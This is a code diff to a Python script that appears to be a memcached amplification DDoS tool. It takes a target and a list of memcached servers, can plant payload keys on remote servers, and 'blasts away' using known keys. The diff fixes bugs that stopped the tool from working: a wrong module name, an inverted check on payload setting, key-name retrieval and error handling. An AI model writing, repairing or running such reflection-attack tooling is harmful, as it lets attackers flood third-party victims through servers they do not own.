@@ -65,7 +65,8 @@ def get_key_name_by_id(server, target, kid):
         for key in resp:
             if 'ITEM' in key:
                 res = re.match(r"(.*)ITEM (?P<keyname>\w+)(.*)", key)
-                return res.group('keyname')
+                keyname = res.group('keyname')
+        return keyname
     except Exception as error:
         print str(error)
         raise IndexError('Could not find memcached key names')
@@ -74,12 +75,11 @@ def set_memcached_payload(server, key, value):
     """Function to optionally set data into an
     entry in memcached for payload usage"""
     try:
-        mc_client = memcached.Client([server], debug=False)
+        mc_client = memcache.Client([server], debug=False)
         mc_client.set(key, value)
         return True
     except Exception as error:
-        print str(error)
-        raise ValueError('Could not set payload on memcached server')
+        raise ValueError('Could not set payload on memcached server: {0}'.format(str(error)))
 
 def fun_packet(server, target, key):
     """The actual sauce"""
@@ -119,7 +119,7 @@ def work_magic(server, target, force_key=False):
 
         # If we want to force our own entries, doit
         if force_key:
-            if set_memcached_payload(server, payload_key, payload):
+            if not set_memcached_payload(server, payload_key, payload):
                 raise Exception('Could not manually set payload')
 
         # iterate thru known keys and blast away
@@ -138,7 +138,8 @@ def main():
     server_help = 'List of servers to utilize (space separated)'
     list_help = 'File path to list of servers (newline separated)'
     target_help = 'Target to test'
-    force_key_help = 'Force manual key creation on remote memcached server(s)'
+    force_key_help = '''Force manual key creation on remote memcached server(s).
+                     This only works if TCP is available!'''
 
     parser.add_argument('-s', '--servers', nargs="+", help=server_help)
     parser.add_argument('-l', '--list', help=list_help)
